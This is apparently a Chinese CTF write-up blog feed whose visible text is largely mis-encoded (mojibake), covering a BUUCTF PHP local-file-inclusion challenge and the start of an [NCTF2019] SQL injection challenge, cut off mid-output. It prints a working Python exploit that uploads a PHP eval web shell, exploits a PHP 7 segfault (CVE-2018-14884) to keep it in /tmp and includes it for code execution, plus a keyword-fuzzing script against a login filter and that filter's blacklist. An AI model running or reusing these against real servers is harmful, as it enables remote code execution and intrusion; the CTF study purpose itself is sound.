/tmpï¼‰ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•åˆ—è¡¨ï¼Œå¹¶å°†å…¶æ‰“å°è¾“å‡ºã€‚<br><br>å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š<br><br>scandir(&#x27;/tmp&#x27;) æ˜¯ PHP çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–æŒ‡å®šç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æŒ‡å®šäº†ç›®å½•ä¸º /tmpï¼Œå³ä¸´æ—¶ç›®å½•ã€‚<br>scandir(&#x27;/tmp&#x27;) è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«äº†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„åå­—ï¼ˆåŒ…æ‹¬ . å’Œ ..ï¼‰ã€‚<br>var_dump() æ˜¯ PHP çš„è°ƒè¯•å‡½æ•°ï¼Œç”¨äºæ‰“å°è¾“å‡ºå˜é‡çš„è¯¦ç»†ä¿¡æ¯ï¼ˆåŒ…æ‹¬ç±»å‹å’Œå€¼ï¼‰ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°† scandir(&#x27;/tmp&#x27;) çš„è¿”å›ç»“æœä½œä¸ºå‚æ•°ä¼ é€’ç»™ var_dump() å‡½æ•°ï¼Œä»¥ä¾¿æŸ¥çœ‹è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•åˆ—è¡¨ã€‚<br>æ‰€ä»¥ï¼Œè¿™æ®µä»£ç çš„ä½œç”¨æ˜¯è·å– /tmp ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•åˆ—è¡¨ï¼Œå¹¶å°†å…¶è¯¦ç»†ä¿¡æ¯æ‰“å°è¾“å‡ºï¼Œä»¥ä¾¿è¿›è¡Œè°ƒè¯•æˆ–æŸ¥çœ‹ç›®å½•å†…å®¹ã€‚<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥dir.phpæ–‡ä»¶å¯ä»¥ç”¨æ¥è·å–&#x2F;tmpç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯</p><h2 id="åˆ©ç”¨php7-segment-faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰"><a href="#åˆ©ç”¨php7-segment-faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰" class="headerlink" title="åˆ©ç”¨php7 segment faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰"></a>åˆ©ç”¨php7 segment faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰</h2><p><img src="/images/2024-2-18/image-20240206162913121.png" alt="image-20240206162913121"></p><p>æ ¹æ®å“åº”åŒ…å¯çŸ¥ï¼Œç½‘ç«™çš„phpç‰ˆæœ¬æ˜¯7.0.33</p><h3 id="PHPä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#PHPä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="PHPä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>PHPä¸´æ—¶æ–‡ä»¶åŒ…å«</h3><h4 id="å‚è€ƒ-PHP-LFI-åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶-Getshell-å§¿åŠ¿-ç å†œå®¶å›­-codenong-com"><a href="#å‚è€ƒ-PHP-LFI-åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶-Getshell-å§¿åŠ¿-ç å†œå®¶å›­-codenong-com" class="headerlink" title="å‚è€ƒ:PHP LFI åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶ Getshell å§¿åŠ¿ | ç å†œå®¶å›­ (codenong.com)"></a>å‚è€ƒ:<a href="https://www.codenong.com/cs106498971/">PHP LFI åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶ Getshell å§¿åŠ¿ | ç å†œå®¶å›­ (codenong.com)</a></h4><h4 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»:"></a>æ¼æ´ä»‹ç»:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">phpä»£ç ä¸­ä½¿ç”¨php://filterçš„strip_tags è¿‡æ»¤å™¨, å¯ä»¥è®© php æ‰§è¡Œçš„æ—¶å€™ç›´æ¥å‡ºç° Segment Fault , è¿™æ · php çš„åƒåœ¾å›æ”¶æœºåˆ¶å°±ä¸ä¼šåœ¨ç»§ç»­æ‰§è¡Œ , å¯¼è‡´ POST çš„æ–‡ä»¶ä¼šä¿å­˜åœ¨ç³»ç»Ÿçš„ç¼“å­˜ç›®å½•ä¸‹ä¸ä¼šè¢«æ¸…é™¤è€Œä¸åƒphpinfoé‚£æ ·ä¸Šä¼ çš„æ–‡ä»¶å¾ˆå¿«å°±ä¼šè¢«åˆ é™¤ï¼Œè¿™æ ·çš„æƒ…å†µä¸‹æˆ‘ä»¬åªéœ€è¦çŸ¥é“å…¶æ–‡ä»¶åå°±å¯ä»¥åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚<br></code></pre></td></tr></table></figure><h4 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼:"></a>æ”»å‡»æ–¹å¼:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">xxx.phpæ˜¯å­˜åœ¨æ–‡ä»¶åŒ…å«çš„phpæ–‡ä»¶:<br>url/xxx.php?file=php://filter/string.strip_tags/resource=æ–‡ä»¶è·¯å¾„<br></code></pre></td></tr></table></figure><p><strong>è¿™ç§ åŒ…å« ä¼šå¯¼è‡´phpæ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°segment faultï¼Œæ­¤æ—¶ä¸Šä¼ æ–‡ä»¶ï¼Œä¸´æ—¶æ–‡ä»¶ä¼šè¢«ä¿å­˜åœ¨upload_tmp_diræ‰€æŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œä¸ä¼šè¢«åˆ é™¤ï¼Œè¿™æ ·å°±èƒ½è¾¾æˆgetshellçš„ç›®çš„ã€‚</strong></p><h4 id="æ ¹æ®è½½è·ç¼–å†™æ”»å‡»è„šæœ¬"><a href="#æ ¹æ®è½½è·ç¼–å†™æ”»å‡»è„šæœ¬" class="headerlink" title="æ ¹æ®è½½è·ç¼–å†™æ”»å‡»è„šæœ¬:"></a>æ ¹æ®è½½è·ç¼–å†™æ”»å‡»è„šæœ¬:</h4><h5 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py:"></a>exp.py:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#python version 2.7</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># ä¸Šä¼ æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶åˆ°/tmpç›®å½•ä¸‹</span><br>payload = <span class="hljs-string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span><br>Pass_files = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(payload.encode())<br>    &#125;<br>url1 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span><br><span class="hljs-comment"># æˆ‘ä»¬è®¾ç½®äº†postä¼ å‚è¯·æ±‚ï¼ŒåŒæ—¶è®¾ç½®äº†æ–‡ä»¶ä¸Šä¼ å‚æ•°files,è¿™æ ·å°±å¯ä»¥é€šè¿‡postè¯·æ±‚ä¸Šä¼ æˆ‘ä»¬çš„æ–‡ä»¶äº†</span><br>r = requests.post(url=url1, files=Pass_files, allow_redirects=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># è·å–/tmp/ç›®å½•ä¸‹æˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶</span><br>url2 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/dir.php&#x27;</span><br>r = requests.get(url2)<br>data = re.search(<span class="hljs-string">r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;</span>, r.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).group(<span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++++++&quot;</span>)<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++++++&quot;</span>)<br><br><span class="hljs-comment"># ä½¿ç”¨æ–‡ä»¶åŒ…å«æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ï¼Œç„¶åè¿›è¡Œrce</span><br>url3 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/flflflflag.php?file=/tmp/&#x27;</span>+data<br>data = &#123;<br>    <span class="hljs-string">&#x27;cmd&#x27;</span>: <span class="hljs-string">&quot;phpinfo();&quot;</span><br>&#125;<br>r = requests.post(url=url3, data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="è®¿é—®-dir-php"><a href="#è®¿é—®-dir-php" class="headerlink" title="è®¿é—®:dir.php:"></a>è®¿é—®:dir.php:</h4><p><strong>ç”±äºæˆ‘è¿è¡Œäº†å¥½å‡ æ¬¡è„šæœ¬ï¼Œæ‰€ä»¥è¦ç”¨æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å:tmp&#x2F;php8dW0yU</strong></p><p><img src="/images/2024-2-18/image-20240206175058318.png" alt="image-20240206175058318"></p><h4 id="åœ¨flflflflag-phpä¸­åŒ…å«tmp-php8dW0yUï¼š"><a href="#åœ¨flflflflag-phpä¸­åŒ…å«tmp-php8dW0yUï¼š" class="headerlink" title="åœ¨flflflflag.phpä¸­åŒ…å«tmp&#x2F;php8dW0yUï¼š"></a>åœ¨flflflflag.phpä¸­åŒ…å«tmp&#x2F;php8dW0yUï¼š</h4><p><strong>ç­‰æ•ˆäºå°†è¯¥æ–‡ä»¶åµŒå…¥flflflflag.phpä¸­ï¼Œå³ä½¿tmp&#x2F;php8dW0yUæ²¡æœ‰åç¼€åï¼Œä½†æ˜¯ç”±äºinclude()åŒ…å«ï¼Œflflflflag.phpæ˜¯ä¸»æ–‡ä»¶ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ä½¿tmp&#x2F;php8dW0yUæ–‡ä»¶çš„å†…å®¹æŒ‰ç…§ä¸»æ–‡ä»¶çš„æ ¼å¼è¿è¡Œã€‚</strong></p><p><img src="/images/2024-2-18/image-20240206175712022.png" alt="image-20240206175712022"></p><p>flag&#x3D;flag{62950e2d-8c41-4734-896d-985a6529576b}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[NCTF2019]SQLi</title>
    <link href="/2024/02/18/2023-08-20-%5BNCTF2019%5DSQLi/"/>
    <url>/2024/02/18/2023-08-20-%5BNCTF2019%5DSQLi/</url>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p><a href="https://www.freesion.com/article/2367234678/">SQLæ­£åˆ™ç›²æ³¨-regexp - ç°ä¿¡ç½‘ï¼ˆè½¯ä»¶å¼€å‘åšå®¢èšåˆï¼‰ (freesion.com)</a></p><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><p><img src="/images/2024-2-18/image-20240205151103629.png" alt="image-20240205151103629"></p><h3 id="è·å–ç½‘é¡µçš„sqlè¯­å¥ï¼š"><a href="#è·å–ç½‘é¡µçš„sqlè¯­å¥ï¼š" class="headerlink" title="è·å–ç½‘é¡µçš„sqlè¯­å¥ï¼š"></a>è·å–ç½‘é¡µçš„sqlè¯­å¥ï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sqlquery : select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;<br></code></pre></td></tr></table></figure><h2 id="ç¬¬ä¸€ä»¶é‡è¦çš„äº‹æƒ…ï¼ŒæŸ¥çœ‹robots-txt"><a href="#ç¬¬ä¸€ä»¶é‡è¦çš„äº‹æƒ…ï¼ŒæŸ¥çœ‹robots-txt" class="headerlink" title="ç¬¬ä¸€ä»¶é‡è¦çš„äº‹æƒ…ï¼ŒæŸ¥çœ‹robots.txt:"></a>ç¬¬ä¸€ä»¶é‡è¦çš„äº‹æƒ…ï¼ŒæŸ¥çœ‹robots.txt:</h2><p><img src="/images/2024-2-18/image-20240205225500432.png" alt="image-20240205225500432"></p><p>å‘ç°å­˜åœ¨ä¸€ä¸ªhint.txt</p><h2 id="æŸ¥çœ‹hint-txt"><a href="#æŸ¥çœ‹hint-txt" class="headerlink" title="æŸ¥çœ‹hint.txt:"></a>æŸ¥çœ‹hint.txt:</h2><p><img src="/images/2024-2-18/image-20240205225545093.png" alt="image-20240205225545093"></p><p>è·å¾—æç¤ºä¿¡æ¯:</p><h3 id="hint-txt"><a href="#hint-txt" class="headerlink" title="hint.txt:"></a>hint.txt:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;<br><br><br>If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,<br><br>Then you will get the flag;<br></code></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦è·å¾—adminçš„å¯†ç ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„adminè´¦æˆ·å¯†ç æ­£ç¡®ï¼Œåˆ™è¿”å›flag,æ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è¦è·å–adminçš„å¯†ç ï¼Œè¿™é‡Œè¦æ³¨æ„adminä¹Ÿè¢«è¿‡æ»¤äº†ã€‚</p><h2 id="æµ‹è¯•ç™»å½•æ¡†"><a href="#æµ‹è¯•ç™»å½•æ¡†" class="headerlink" title="æµ‹è¯•ç™»å½•æ¡†:"></a>æµ‹è¯•ç™»å½•æ¡†:</h2><p><img src="/images/2024-2-18/image-20240205151307447.png" alt="image-20240205151307447"></p><h3 id="å“åº”å†…å®¹ï¼š"><a href="#å“åº”å†…å®¹ï¼š" class="headerlink" title="å“åº”å†…å®¹ï¼š"></a>å“åº”å†…å®¹ï¼š</h3><p><img src="/images/2024-2-18/image-20240205151328364.png" alt="image-20240205151328364"></p><p>å­˜åœ¨å¯¹æˆ‘ä»¬è¾“å…¥çš„å…³é”®è¯è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè¦ç¡®å®šå®ƒè¿‡æ»¤å“ªäº›å†…å®¹</p><h2 id="ä½¿ç”¨bpæŠ“åŒ…è·å–å®ƒçš„ä¼ å‚å†…å®¹"><a href="#ä½¿ç”¨bpæŠ“åŒ…è·å–å®ƒçš„ä¼ å‚å†…å®¹" class="headerlink" title="ä½¿ç”¨bpæŠ“åŒ…è·å–å®ƒçš„ä¼ å‚å†…å®¹:"></a>ä½¿ç”¨bpæŠ“åŒ…è·å–å®ƒçš„ä¼ å‚å†…å®¹:</h2><h3 id="BPæŠ“åŒ…"><a href="#BPæŠ“åŒ…" class="headerlink" title="BPæŠ“åŒ…:"></a>BPæŠ“åŒ…:</h3><p><img src="/images/2024-2-18/image-20240205151548518.png" alt="image-20240205151548518"></p><p><img src="/images/2024-2-18/image-20240205151606864.png" alt="image-20240205151606864"></p><p>è·å–åˆ°æ˜¯åœ¨index.phpä¸‹çš„postä¼ å‚ï¼Œå‚æ•°ä¸ºusername,passwd</p><h3 id="è·å–å“åº”ä¿¡æ¯"><a href="#è·å–å“åº”ä¿¡æ¯" class="headerlink" title="è·å–å“åº”ä¿¡æ¯:"></a>è·å–å“åº”ä¿¡æ¯:</h3><p><img src="/images/2024-2-18/image-20240205151746755.png" alt="image-20240205151746755"></p><p>å“åº”ä¿¡æ¯ä¸ºalert(â€˜hacker!!!â€™);</p><h2 id="ä½¿ç”¨è„šæœ¬è·å–ç½‘ç«™çš„è¿‡æ»¤ä¿¡æ¯"><a href="#ä½¿ç”¨è„šæœ¬è·å–ç½‘ç«™çš„è¿‡æ»¤ä¿¡æ¯" class="headerlink" title="ä½¿ç”¨è„šæœ¬è·å–ç½‘ç«™çš„è¿‡æ»¤ä¿¡æ¯:"></a>ä½¿ç”¨è„šæœ¬è·å–ç½‘ç«™çš„è¿‡æ»¤ä¿¡æ¯:</h2><h3 id="fuzz-py"><a href="#fuzz-py" class="headerlink" title="fuzz.py:"></a>fuzz.py:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list = []<br>white_list = []<br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span class="hljs-string">&quot;http://fe2b3a55-cad0-4bb2-86b2-06d51d5c8cd2.node5.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     # da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1/**/&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br><span class="hljs-comment">#     reponse_txt = &quot;ä½ è¿˜æƒ³æ‰§è¡Œ&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(data)</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    <span class="hljs-comment"># POSTä¼ è¾“jsonæ•°æ®</span><br>    payload = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:da,<br>        <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;&#x27;hacker!!!&quot;</span><br>    <span class="hljs-comment"># print(r.text)</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br>    <span class="hljs-keyword">else</span>:<br>        white_list.append(d)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é»‘åå•æ•°æ®:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(black_list))<br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç™½åå•æ•°æ®:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(white_list))<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">é»‘åå•æ•°æ®:[&#x27;mid&#x27;, &#x27;handler&#x27;, &#x27;like&#x27;, &#x27;LiKe&#x27;, &#x27;substr&#x27;, &#x27;SubStr&#x27;, &#x27;select&#x27;, &#x27;SeleCT&#x27;, &#x27;SElect&#x27;, &#x27;SELect&#x27;, &#x27;sleep&#x27;, &#x27;SLEEp&#x27;, &#x27;database&#x27;, &#x27;DATABASe&#x27;, &#x27;having&#x27;, &#x27;or&#x27;, &#x27;oroR&#x27;, &#x27;Or&#x27;, &#x27;oR&#x27;, &#x27;OR&#x27;, &#x27;-~&#x27;, &#x27;BENCHMARK&#x27;, &#x27;limit&#x27;, &#x27;limitLimIt&#x27;, &#x27;LImit&#x27;, &#x27;LimIt&#x27;, &#x27;select&#x27;, &#x27;SELECT&#x27;, &#x27;insert&#x27;, &#x27;insERT&#x27;, &#x27;INSERT&#x27;, &#x27;#&#x27;, &#x27;--+&#x27;, &#x27;INFORMATION&#x27;, &#x27;--&#x27;, &#x27;xor&#x27;, &#x27;&lt;&gt;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &#x27;.&#x27;, &#x27;=&#x27;, &#x27;ANDANd&#x27;, &#x27;And&#x27;, &#x27;and&#x27;, &#x27;aNd&#x27;, &#x27;BY&#x27;, &#x27;By&#x27;, &quot;&#x27;1&#x27;=&#x27;1&quot;, &quot;admin&#x27;&quot;, &#x27;length &#x27;, &#x27;select &#x27;, &#x27;database&#x27;, &#x27;union&#x27;, &#x27;UNIon&#x27;, &#x27;UNION&#x27;, &#x27;oorr&#x27;, &#x27;anandd&#x27;, &#x27;HAVING&#x27;, &#x27;IF&#x27;, &#x27;INTO&#x27;, &#x27;JOIN&#x27;, &#x27;sleep&#x27;, &#x27;LIKE&#x27;, &#x27;infromation_schema&#x27;, &#x27;OR&#x27;, &#x27;ORDER&#x27;, &#x27;ORD&#x27;, &#x27;SELECT&#x27;, &#x27;TABLE&#x27;, &#x27;UNION&#x27;, &#x27;USING&#x27;, &#x27;WHERE&#x27;, &#x27;AND&#x27;, &#x27;inset&#x27;, &#x27;CONCAT&#x27;, &#x27;GROUP_CONCAT&#x27;, &#x27;group_concat&#x27;, &#x27;DATABASE&#x27;, &#x27;DATABASES&#x27;, &#x27;floor&#x27;, &#x27;rand()&#x27;, &#x27;information_schema.tables&#x27;, &#x27;TABLE_SCHEMA&#x27;, &#x27;concat_ws()&#x27;, &#x27;concat&#x27;, &#x27;LIMIT&#x27;, &#x27;ORD&#x27;, &#x27;order &#x27;, &#x27;CAST()&#x27;, &#x27;by&#x27;, &#x27;ORDER&#x27;, &#x27;SELECT&#x27;, &#x27;TABLE&#x27;, &#x27;instr&#x27;, &#x27;benchmark&#x27;, &#x27;format&#x27;, &#x27;bin&#x27;, &#x27;substring&#x27;, &#x27;ord&#x27;, &#x27;VARCHAR&#x27;, &#x27;WHERE&#x27;, &#x27;  &#x27;, &#x27;,&#x27;, &#x27;users&#x27;, &#x27;mid&#x27;, &#x27;for&#x27;, &#x27;BEFORE&#x27;, &#x27;RLIKE&#x27;, &#x27;in&#x27;, &#x27;sys schemma&#x27;, &#x27;SEPARATOR&#x27;, &#x27;XOR&#x27;, &#x27;CURSOR&#x27;, &#x27;FLOOR&#x27;, &#x27;sys.schema_table_statistics_with_buffer&#x27;, &#x27;INFILE&#x27;, &#x27;=&#x27;, &#x27; &#x27;]<br><br>ç™½åå•æ•°æ®:[&#x27;length&#x27;, &#x27;column&#x27;, &#x27;Length&#x27;, &#x27;+&#x27;, &#x27;delete&#x27;, &#x27;asAs&#x27;, &#x27;aS&#x27;, &#x27;As&#x27;, &#x27;AS&#x27;, &#x27;left&#x27;, &#x27;Left&#x27;, &#x27;LEft&#x27;, &#x27;Left&#x27;, &#x27;right&#x27;, &#x27;;&#x27;, &#x27;!&#x27;, &#x27;%&#x27;, &#x27;+&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, <br>&#x27;^&#x27;, &#x27;CAST&#x27;, &#x27;COLUMN&#x27;, &#x27;COlumn&#x27;, &#x27;COUNT&#x27;, &#x27;Count&#x27;, &#x27;CREATE&#x27;, &#x27;END&#x27;, &#x27;case&#x27;, &#x27;when&#x27;, &#x27;&quot;&#x27;, &#x27;+&#x27;, &#x27;REVERSE&#x27;, &#x27;&#x27;, &#x27;ascii&#x27;, &#x27;ASSIC&#x27;, &#x27;ASSic&#x27;, &#x27;left&#x27;, &#x27;right&#x27;, &#x27;&quot;&#x27;, &#x27;&amp;&#x27;, &#x27;&amp;&amp;&#x27;, &#x27;||&#x27;, &#x27;/&#x27;, &#x27;//&#x27;, &#x27;//*&#x27;, &#x27;*/*&#x27;, &#x27;/**/&#x27;, &#x27;GROUP&#x27;, &#x27;LEAVE&#x27;, &#x27;LEFT&#x27;, &#x27;LEVEL&#x27;, &#x27;NAMES&#x27;, &#x27;NEXT&#x27;, &#x27;NULL&#x27;, &#x27;OF&#x27;, &#x27;ON&#x27;, &#x27;|&#x27;, &#x27;user&#x27;, &#x27;SCHEMA&#x27;, &#x27;SET&#x27;, &#x27;THEN&#x27;, &#x27;UPDATE&#x27;, &#x27;USER&#x27;, &#x27;VALUE&#x27;, &#x27;VALUES&#x27;, &#x27;WHEN&#x27;, &#x27;ADD&#x27;, &#x27;prepare&#x27;, &#x27;set&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;drop&#x27;, &#x27;CAST&#x27;, &#x27;COLUMN&#x27;, &#x27;CREATE&#x27;, &#x27;alter&#x27;, 